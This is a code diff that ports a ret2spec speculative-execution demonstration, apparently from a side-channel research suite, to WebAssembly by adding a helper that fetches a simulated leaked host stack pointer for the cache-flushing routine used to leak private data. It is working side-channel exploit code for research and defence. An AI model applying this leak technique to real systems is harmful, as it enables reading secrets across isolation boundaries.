@@ -8,6 +8,10 @@
 #include "ret2spec_common.h"
 #include "utils.h"
 
+#ifdef SAFESIDE_WASM
+#include <wasi/api.h>
+#endif
+
 // We cannot include the private_data twice, because that would lead to linking
 // error. Declaring it extern in here.
 extern const char *private_data;
@@ -32,6 +36,20 @@ bool false_value = false;
 // from the cache.
 std::vector<char *> stack_mark_pointers;
 
+// Get a pointer to somewhere in the current stack frame
+static inline SAFESIDE_ALWAYS_INLINE char* getStackPtr(char* guest_stack_ptr) {
+#ifdef SAFESIDE_WASM
+  // on Wasm platforms, we use __wasi_get_host_stack_ptr (which provides a host
+  // stack pointer directly, simulating the ability to leak one)
+  uint64_t stack_ptr;
+  (void)__wasi_get_host_stack_ptr(&stack_ptr);
+  return (char*) stack_ptr;
+#else
+  // in non-Wasm platforms, host and guest stack pointers are the same
+  return guest_stack_ptr;
+#endif
+}
+
 // Always returns false.
 bool ReturnsFalse(int counter) {
   if (counter > 0) {
@@ -52,9 +70,9 @@ bool ReturnsFalse(int counter) {
 
 // Always returns true.
 static bool ReturnsTrue(int counter) {
-  // Creates a stack mark and stores it to the global vector.
   char stack_mark = 'a';
-  stack_mark_pointers.push_back(&stack_mark);
+  char* stack_ptr = getStackPtr(&stack_mark);
+  stack_mark_pointers.push_back(stack_ptr);
 
   if (counter > 0) {
     // Recursively invokes itself.
@@ -69,7 +87,7 @@ static bool ReturnsTrue(int counter) {
   // own stack mark and the next one. Somewhere there must be also the return
   // address.
   stack_mark_pointers.pop_back();
-  FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
+  FlushFromDataCache(stack_ptr, stack_mark_pointers.back());
   return true;
 }
 
@@ -84,7 +102,8 @@ char Ret2specLeakByte() {
     // Stack mark for the first call of ReturnsTrue. Otherwise it would read
     // from an empty vector and crash.
     char stack_mark = 'a';
-    stack_mark_pointers.push_back(&stack_mark);
+    char* stack_ptr = getStackPtr(&stack_mark);
+    stack_mark_pointers.push_back(stack_ptr);
     ReturnsTrue(kRecursionDepth);
     stack_mark_pointers.pop_back();
 
